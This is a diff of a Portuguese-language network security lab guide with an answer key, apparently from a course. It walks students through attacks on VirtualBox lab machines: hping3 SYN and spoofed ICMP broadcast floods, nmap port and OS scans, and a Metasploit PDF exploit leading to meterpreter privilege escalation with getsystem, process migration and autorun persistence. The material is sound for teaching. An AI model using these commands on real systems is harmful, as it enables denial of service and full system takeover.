@@ -8,7 +8,7 @@ ifdef::oneof[]
 :source-highlighter: rouge
 :listing-caption: Listing
 :pdf-page-size: A4
-:revdate: 25-09-2018
+:revdate: 10-10-2018
 :imagesdir: ../img
 :srcdir: ../src
 :icons: font
@@ -42,7 +42,7 @@ image::Vbox_sharedfolder.png[align="center"]
 [#img-sharedfolder-view]
 image::Vbox_sharedfolder_view.png[align="center"]
 
-5. Pronto! Agora, basta fazer o download de programas e arquivos em sua máquina física, colocá-los dentro da pasta compartilhada, e suas VMs terão acesso imediato. Se desejar, repita o procedimento para a máquina _WinClient-G_.
+5. Pronto! Agora, basta fazer o download de programas e arquivos em sua máquina física, colocá-los dentro da pasta compartilhada, e suas VMs terão acesso imediato. Para concluir, repita o procedimento para a máquina _WinClient-G_.
 
 === 2) *_Sniffers_* para captura de dados
 
@@ -114,9 +114,9 @@ ifdef::gabarito[]
 
 (...)
 
-# tcpdump ip -i eth1 -n host not 172.16.1.254
+# tcpdump ip -i enp0s8 -n host not 172.16.1.254
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
+listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes
 ....
 +
 Note que o filtro acima exclui pacotes IPv6 e pacotes vindos da máquina física (que também encontra-se conectada à rede _host-only_, com o endereço 172.16.1.254), para não atrapalhar o processo de análise.
@@ -127,7 +127,7 @@ ifdef::gabarito[]
 +
 ....
 # hostname
-kali
+KaliLinux-A
 
 # hping3 172.16.1.1 -S -p 22 --flood --rand-source
 HPING 172.16.1.1 (eth0 172.16.1.1): S set, 40 headers + 0 data bytes
@@ -142,7 +142,7 @@ hping in flood mode, no replies will be shown
 --
 endif::gabarito[]
 
-4. Pare a execução do `hping` com CTRL+C. De volta à máquina _FWGW1-G_, verifique que o ataque está sendo realizado como esperado e interprete a saída do `tcpdump`.
+4. Ainda com o `hping3` executando, volte à máquina _FWGW1-G_ e verifique que o ataque está sendo realizado como esperado e interprete a saída do `tcpdump`. Tente abrir uma nova conexão `ssh` -- o que acontece?
 ifdef::gabarito[]
 +
 Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do _output_ do `tcpdump`:
@@ -162,10 +162,55 @@ Note que os IPs de origem são todos distintos, como esperado. Além disso, todo
 +
 Assim que o servidor recebe o SYN inicial, ele aloca memória para atender o cliente e responde com um SYN-ACK. No caso de um ataque SYN _flood_, como o desta atividade, o atacante envia um grande número de pacotes SYN sem qualquer intenção de responder o SYN-ACK recebido com um ACK (e, assim, fechar o _three-way handshake_). Se o atacante estiver usando endereços IP _spoofed_, o que estamos fazendo, o SYN-ACK sequer chega a ser recebido.
 +
-Durante este período o servidor não pode fechar a conexão com um pacote RST, e ela permanece aberta. Antes do _timeout_, outros pacotes SYN vindos do atacante chegam, e começam a deixar um número crescente de conexões em estado _half-open_. Eventualmente, as tabelas de _overflow_ de conexão de servidor ficam cheias, e clientes legítimos têm seu acesso negado ao serviço.
+Durante este período o servidor não pode fechar a conexão com um pacote RST, e ela permanece aberta. Antes do _timeout_, outros pacotes SYN vindos do atacante chegam, e começam a deixar um número crescente de conexões em estado _half-open_. Eventualmente, as tabelas de _overflow_ de conexão de servidor ficam cheias, e clientes legítimos têm seu acesso negado ao serviço. Para testar esse efeito, tente abrir uma nova conexão `ssh` com a máquina _FWGW1-G_ -- após algum tempo, o sistema nos retorna com _timeout_.
++
+....
+$ ssh aluno@172.16.1.1
+ssh: connect to host 172.16.1.1 port 22: Connection timed out
+....
++
+Para verificar a tabela de conexões corrente, podemos usar o comando `ss`:
++
+....
+# ss -nta | grep '^SYN-RECV' | head -n5
+SYN-RECV   0      0      172.16.1.1:22                 142.97.227.2:36000
+SYN-RECV   0      0      172.16.1.1:22                 15.198.184.201:18948
+SYN-RECV   0      0      172.16.1.1:22                 21.212.184.142:2254
+SYN-RECV   0      0      172.16.1.1:22                 201.62.25.47:18949
+SYN-RECV   0      0      172.16.1.1:22                 14.55.146.26:18953
+....
++
+Verificando a lista de conexões abertas e em espera pelo `ssh`, observamos o valor 128 no campo _Send-Q_:
++
+....
+# ss -nta | sed -n '1p;/^LISTEN/p' | grep -v ':::'
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
+LISTEN     0      128          *:22                       *:*
+....
++
+Esse campo denota o número de bytes não confirmados como recebidos pelo receptor, efetivamente configurando a fila de envio do sistema. Para mais detalhes sobre esse campo em particular, instale o binário `netstat` (`apt-get install net-tools`) e verifique sua _manpage_ com o comando `man 8 netstat`.
++
+O número 128 é idêntico aos _sysctls_ `net.ipv4.tcp_max_syn_backlog` e `net.core.somaxconn`, como visualizado abaixo:
++
+....
+# sysctl -a | grep max_syn_backlog
+net.ipv4.tcp_max_syn_backlog = 128
+....
++
+....
+# sysctl -a | grep somaxconn
+net.core.somaxconn = 128
+....
++
+Esses _sysctls_ são definidos como:
++
+--
+* `net.ipv4.tcp_max_syn_backlog`: quantas conexões _half-open_ para as quais um cliente ainda não enviou pacote ACK correspondente podem ser mantidas na fila do kernel. O valor padrão, como visto, é de 128. Se essa fila estiver cheia, clientes legítimos não poderão conectar-se, como observamos anteriormente.
+* `net.core.somaxconn`: número máximo que o _sysctl_ `net.ipv4.tcp_max_syn_backlog` pode assumir. Atua como um limite superior para o _sysctl_ anterior.
+--
 endif::gabarito[]
 
-5. Reative a proteção _TCP SYN Cookies_ do kernel da máquina _FWGW1-G_.
+5. Na máquina _KaliLinux-G_, pare a execução do `hping3` com `CTRL + C`. Em seguida, reative a proteção _TCP SYN Cookies_ do kernel da máquina _FWGW1-G_.
 ifdef::gabarito[]
 +
 ....
@@ -210,7 +255,7 @@ LinServer-A
 +
 ....
 # hostname
-kali
+KaliLinux-A
 
 # echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
 ....
@@ -220,9 +265,9 @@ endif::gabarito[]
 ifdef::gabarito[]
 +
 ....
-# tcpdump ip -i eth1 -n host not 172.16.1.254
+# tcpdump ip -i enp0s8 -n host not 172.16.1.254
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
+listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes
 ....
 endif::gabarito[]
 
@@ -231,7 +276,7 @@ ifdef::gabarito[]
 +
 ....
 # hostname
-kali
+KaliLinux-A
 
 # hping3 172.16.1.255 --icmp --flood --spoof 172.16.1.1
 HPING 172.16.1.255 (eth0 172.16.1.255): icmp mode set, 28 headers + 0 data bytes
@@ -263,7 +308,7 @@ Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto
 +
 Note que a máquina _FWGW1-G_ identifica o seu próprio IP como sendo o originário dos pacotes _echo-request_ enviados para _broadcast_. A seguir, as máquinas _LinServer-G_ e _KaliLinux-G_ (esta, a atacante), respondem em massa com ICMP _echo-replies_ para a vítima, sobrecarregando seus recursos.
 +
-Finalmente, pode-se usar também a opção `-d` (ou `--data`, para _data size_) do `hping3`, fazendo com que o tamanho dos pacotes _echo-request_ -- e por conseguinte dos _echo-replies_ -- seja tão grande quanto o definido na linha de comando. Isso pode ser utilizado para dar mais força ao ataque, e consumir mais rapidamente a band da vítima.
+Finalmente, pode-se usar também a opção `-d` (ou `--data`, para _data size_) do `hping3`, fazendo com que o tamanho dos pacotes _echo-request_ -- e por conseguinte dos _echo-replies_ -- seja tão grande quanto o definido na linha de comando. Isso pode ser utilizado para dar mais força ao ataque, e consumir mais rapidamente a banda da vítima.
 endif::gabarito[]
 
 5. Reative a proteção para ignorar ICMP _echo-requests_ direcionados a _broadcast_ do kernel das máquinas _FWGW1-G_, _LinServer-G_ e _KaliLinux-G_.
@@ -285,7 +330,7 @@ LinServer-A
 (...)
 
 # hostname
-kali
+KaliLinux-A
 
 # echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
 ....
@@ -307,18 +352,17 @@ Primeiro, vamos ver o que acontece na máquina _KaliLinux-G_:
 +
 ....
 # nmap -v 172.16.1.20
-
-Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2018-08-18 01:19 EDT
-Initiating ARP Ping Scan at 01:19
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-10 18:28 -03
+Initiating ARP Ping Scan at 18:28
 Scanning 172.16.1.20 [1 port]
-Completed ARP Ping Scan at 01:19, 0.20s elapsed (1 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 01:19
-Completed Parallel DNS resolution of 1 host. at 01:19, 0.03s elapsed
-Initiating SYN Stealth Scan at 01:19
+Completed ARP Ping Scan at 18:28, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 18:28
+Completed Parallel DNS resolution of 1 host. at 18:28, 0.02s elapsed
+Initiating SYN Stealth Scan at 18:28
 (...)
-Completed SYN Stealth Scan at 01:20, 24.20s elapsed (1000 total ports)
+Completed SYN Stealth Scan at 18:28, 2.51s elapsed (1000 total ports)
 Nmap scan report for 172.16.1.20
-Host is up (0.00022s latency).
+Host is up (0.00010s latency).
 Not shown: 988 closed ports
 PORT      STATE SERVICE
 80/tcp    open  http
@@ -333,11 +377,11 @@ PORT      STATE SERVICE
 49155/tcp open  unknown
 49156/tcp open  unknown
 49157/tcp open  unknown
-MAC Address: 08:00:27:44:C2:10 (Cadmus Computer Systems)
+MAC Address: 08:00:27:3D:C8:B2 (Oracle VirtualBox virtual NIC)
 
 Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 24.54 seconds
-           Raw packets sent: 1660 (73.024KB) | Rcvd: 1135 (45.436KB)
+Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
+           Raw packets sent: 1153 (50.716KB) | Rcvd: 1001 (40.076KB)
 ....
 +
 Solicita-se um _scan_ _verbose_ da máquina _WinServer-G_. Após resolução ARP/DNS, o `nmap` escaneia as mil portas mais comuns para cada protocolo. Depois, ele relata quais portas foram detectadas como abertas, juntamente com o nome de serviço que usualmente escuta naquela porta.
@@ -402,23 +446,23 @@ Primeiro, vamos escanear a máquina _FWGW1-G_, realizando o _OS fingerprinting_ 
 
 (...)
 Device type: general purpose
-Running: Linux 3.X
-OS CPE: cpe:/o:linux:linux_kernel:3
-OS details: Linux 3.2 - 3.19
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
 Network Distance: 1 hop
 
 OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 3.30 seconds
+Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
 ....
 +
-Detectou-se que o SO da máquina-alvo é um kernel Linux, versões 3.2 a 3.19. Vamos verificar se o `nmap` está correto, logando na máquina _FWGW1-G_ e imprimindo a versão do kernel:
+Detectou-se que o SO da máquina-alvo é um kernel Linux, versões 3.2 a 4.9. Vamos verificar se o `nmap` está correto, logando na máquina _FWGW1-G_ e imprimindo a versão do kernel:
 +
 ....
 # hostname
 FWGW1-A
 
 # uname -r
-3.16.0-4-amd64
+4.9.0-8-amd64
 ....
 +
 Perfeito! Vamos partir para o _scan_ da máquina _WinServer-G_:
@@ -429,12 +473,12 @@ Perfeito! Vamos partir para o _scan_ da máquina _WinServer-G_:
 (...)
 Device type: general purpose
 Running: Microsoft Windows 7|2008|8.1
-OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
-OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows 8, or Windows 8.1 Update 1
+OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
 Network Distance: 1 hop
 
 OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 84.62 seconds
+Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
 ....
 +
 Vamos verificar se a informação está correta:
@@ -461,7 +505,7 @@ Nessa atividade iremos executar uma série de comandos utilizando o `metasploit`
 +
 ....
 # hostname
-kali
+KaliLinux-A
 
 # msfconsole
 
@@ -510,7 +554,7 @@ f. Finalmente, executamos `exploit`. No caso particular desse _exploit_, esse co
 +
 ....
 # hostname
-kali
+KaliLinux-A
 
 # msfconsole
 
@@ -558,7 +602,51 @@ image::metasploit-pdf.png[align="center"]
 meterpreter >
 ....
 
-8. Se o usuário fechar o Adobe Reader ou reiniciar a máquina, a conexão será perdida. Podemos executar o módulo `persistence` do `meterpreter` -- trata-se de um _script_ Ruby que irá criar um serviço do `meterpreter` que será iniciado assim que a máquina for ligada.
+8. Primeiro, vamos escalar privilégios dentro da máquina-alvo. Se você executar o comando `getuid`, irá notar que o `meterpreter` está executando como o usuário que abriu o PDF originalmente (provavelmente, o usuário `Administrator`).
++
+....
+meterpreter > getuid
+Server username: WINSERVER-A\Administrator
+....
++
+O Windows possui uma conta com privilégios ainda mais elevados que o `Administrator`, a conta `SYSTEM`. Essa conta possui os mesmos privilégios do administrador, mas pode também gerenciar todos os serviços, arquivos e volumes em nível de sistema operacional -- com efeito, uma espécie de "super-root" do SO. Felizmente, o `meterpreter` possui o _script_ `getsystem`, que permite a escalada de privilégio de forma automática:
++
+....
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+....
+
+9. Se o usuário fechar o Adobe Reader ou reiniciar a máquina, a conexão será perdida. Podemos usar o comando `migrate` para alterar o binário em que o `meterpreter` está alojado, de forma que se o usuário fechar o PDF aberto, não perderemos conexão com a máquina. Primeiro, vamos descobrir um processo adequado e então migrar para ele:
++
+....
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name              Arch  Session  User                          Path
+ ---   ----  ----              ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System            x86   0
+ 420   4     smss.exe          x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe  456   1040  taskeng.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
+ 488   476   csrss.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  532   524   csrss.exe         x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  540   476   wininit.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 568   524   winlogon.exe      x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 616   540   services.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 628   540   lsass.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  636   540   lsm.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 796   616   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 840   616   VBoxService.exe   x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VBoxService.exe
+ 892   616   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+....
++
+....
+meterpreter > migrate 796
+[*] Migrating from 1932 to 796...
+[*] Migration completed successfully.
+....
+
+10. Em seguida, vamos executar o módulo `persistence` do `meterpreter` -- trata-se de um _script_ Ruby que irá criar um serviço do `meterpreter` que será iniciado assim que a máquina for ligada.
 +
 ....
 meterpreter > run persistence -X
@@ -572,24 +660,6 @@ meterpreter > run persistence -X
 [*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
 [+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
 ....
-
-9. A última etapa é escalar privilégios dentro da máquina-alvo. Se você executar o comando `getuid`, irá notar que o `meterpreter` está executando como o usuário que abriu o PDF originalmente (provavelmente, o usuário `Administrator`).
-+
-....
-meterpreter > getuid
-Server username: WINSERVER-A\Administrator
-....
-
-10. O Windows possui uma conta com privilégios ainda mais elevados que o `Administrator`, a conta `SYSTEM`. Essa conta possui os mesmos privilégios do administrador, mas pode também gerenciar todos os serviços, arquivos e volumes em nível de sistema operacional -- com efeito, uma espécie de "super-root" do SO. Felizmente, o `meterpreter` possui o _script_ `getsystem`, que permite a escalada de privilégio de forma automática:
-+
-....
-meterpreter > getsystem
-...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
-....
-+
-<<<
 
 11. Efetivamente, agora a máquina _WinServer-G_ está totalmente dominada. Agora, faça testes com os comandos que se seguem para determinar quais são as possibilidades apresentadas pelo `meterpreter` -- sua imaginação é o limite!
 +
@@ -627,7 +697,7 @@ ifdef::gabarito[]
 +
 ....
 # hostname
-kali
+KaliLinux-A
 
 # nc 172.16.1.1 22
 SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1
